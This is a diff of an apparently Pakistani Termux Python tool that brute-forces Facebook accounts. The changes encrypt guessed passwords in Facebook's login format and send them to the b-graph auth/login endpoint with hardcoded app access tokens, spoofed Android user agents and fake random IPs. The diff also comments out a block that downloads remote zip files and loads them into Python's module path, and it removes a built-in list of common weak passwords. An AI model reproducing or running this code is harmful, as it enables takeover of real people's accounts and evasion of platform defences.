@@ -4,13 +4,12 @@
 #coding = utf-8
 from uuid import uuid4
 import os,sys,tempfile,string,random,subprocess,uuid
-http_directory = tempfile.mkdtemp(prefix='.')
+'''http_directory = tempfile.mkdtemp(prefix='.')
 site_packages = sys.path[4]
-print(site_packages)
-print(http_directory)
 sys.path.remove(site_packages)
 sys.path.insert(4,http_directory+'/reqmodule')
 sys.path.insert(5,http_directory)
+print(http_directory)
 try:
         os.mkdir('crypto')
 except:pass
@@ -38,7 +37,7 @@ else:
         lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
         os.system(f'curl -L {lib} > {http_directory}/config.zip')
         os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
-        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')'''
 try:
         import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
         from string import *
@@ -105,7 +104,7 @@ logo= f'''
      "Y888888"   "Y8888P"  888   T88b     
             Y8b
 {50*"-"}
-    Tool Version :     10.1.60
+    Tool Version :     10.1.30
     Thanks Alot  :     M.Hamza
 {50*"-"}'''
 
@@ -155,14 +154,12 @@ def qsbuy():
         try:
                 os.system('clear')
                 print(logo)
-                x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
+                x = requests.get('https://raw.githubusercontent.com/hop06/libraries/main/version.txt').text
                 if str("upppdate") in update:
                         os.system('clear')
                         exit('script is in update / maintanance be patient ')
                 elif str("res-sseett") in update:
-                        os.system('')
-                        os.system('')
-                        os.system('')
+                        
                         exit('Dont Try To Bypass')
                 elif bumper in myweb2:
                         main()
@@ -184,13 +181,9 @@ def qsbuy():
         except requests.exceptions.ConnectionError:
                 exit(' No internet connection ..')
 
-def rrrr():
-        if bumper in myweb2:
-                pass
-        else:
-                qsbuy()
 def xchker():
     pass
+
 def main():
         xchker()
         os.system('rm -rf ...txt')
@@ -446,14 +439,37 @@ class crack_main():
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
-                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
+                                password = pas
+                                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
+                                pwd_key_fetch_data = {'version':'2','flow':'CONTROLLER_INITIALIZATION','method':'GET','fb_api_req_friendly_name':'pwdKeyFetch','fb_api_caller_class':'com.facebook.auth.login.AuthOperations','access_token':"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28"}
+                                pwd = requests.post(pwd_key_fetch,params=pwd_key_fetch_data).json()
+                                password_encryption_pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmofqjEw46+3ec9y3Eq1V\ny46SazS16Mlb5Ks3mQ0rG40qnkoSQmIaThD5t+tLdEWrc/rwSAdj0L2Ez01Yh4Uz\nhLIliy5hjkt8geAzV6pqgMa48y16b4fjQqsVf0KSFSaXD5IBYm0ErXck8/UKX36W\ngIE1E4QLAAZMcOJQsHZl39P/QVs4Y9lP1/WR7k9sFDbazmyBbyCIAFjHJH7x+Txf\nloj7jbbqbB3b5xC9tolyjiC3Fqybn/MrHOdJI27lQTnTiFeJuW1SpMwRULtf2Cbo\n0WsoQKWzxsUSFHupVS/0DCdx3QaKBPugrs/MTdUeCJDXBZVjTRT9kAtrWSe5u1BR\n5QIDAQAB\n-----END PUBLIC KEY-----\n'
+                                password_encryption_key_id = '25'
+                                rand_key = get_random_bytes(32)
+                                iv = get_random_bytes(12)
+                                pubkey_bytes = password_encryption_pubkey
+                                pubkey = RSA.import_key(pubkey_bytes)
+                                cipher_rsa = PKCS1_v1_5.new(pubkey)
+                                encrypted_rand_key = cipher_rsa.encrypt(rand_key)
+                                cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
+                                current_time = int(time.time())
+                                cipher_aes.update(str(current_time).encode("utf-8"))
+                                encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+                                buf = io.BytesIO()
+                                buf.write(bytes([1, int(password_encryption_key_id)]))
+                                buf.write(iv)
+                                buf.write(struct.pack("<h", len(encrypted_rand_key)))
+                                buf.write(encrypted_rand_key)
+                                buf.write(auth_tag)
+                                buf.write(encrypted_passwd)
+                                encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
+                                enc_pas=f"#PWD_REACTNATIVE:2:{current_time}:{encoded}"
                                 adid = str(uuid.uuid4())
-                                abhi = "5531728|62f8ce9"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
-                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
-                                #print(po,hdata)ata)
+                                my_ip = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
+                                uat = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+str(random.randint(210,250))+".1.0."+str(random.randint(50,90))+"."+str(random.randint(210,260))+";FBBV/416670383;FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/"+model_+";FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
+                                head = {"user-agent": uat,"Content-Type": "application/json;charset=utf-8","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
+                                data = {"locale":"en_US","format":"json","email":iid,"password":enc_pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
+                                po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
                                 try:
                                         roid = str(po['uid'])
                                 except:
@@ -497,27 +513,11 @@ class crack_main():
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo);xchker()
-                print(' for auto password list type auto or Auto')
+                pl = int(input(' How Much Password Do You Want To Add ? '))
+                print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
-                pl = input(' How Much Password Do You Want To Add ? ')
-                if pl in ['auto','Auto','AUTO','auto or Auto']:
-                        passlist.append('first123')
-                        passlist.append('first12345')
-                        passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
-                        passlist.append('khan123')
-                        passlist.append('first786')
-                        passlist.append('first12')
-                        passlist.append('first1122')
-                        passlist.append('last123')
-                        passlist.append('last12')
-                        passlist.append('i love you')
-                else:
-                        print(' Example first123,last123,khan123,firstlast')
-                        print(50*"-")
-                        for cd in range(int(pl)):
-                                passlist.append(input(f' ({cd+1}) Password : '))
+                for cd in range(pl):
+                        passlist.append(input(f' ({cd+1}) Password : '))
                 os.system('clear')
                 print(logo);xchker()
                 print(' Total Ids : '+str(len(self.id)))
@@ -769,8 +769,8 @@ try:
         fileee = os.listdir('/sdcard/Android/data/')
         if f'com.h{t}pc{a}y.pro' in fileee:
                 print('error occur 0')
-                exit()
-                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
+                pass
+              #  exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
 except Exception as e:
         print(e)
         pass
@@ -778,8 +778,8 @@ except PermissionError:
         pass
 
 
-'''#----[if-fork]------
-pat = os.getcwd()
+#----[if-fork]------
+'''pat = os.getcwd()
 datar = []
 datar.append(pat)
 if '/data/data/com.termux/files/home/Qsr' in datar:
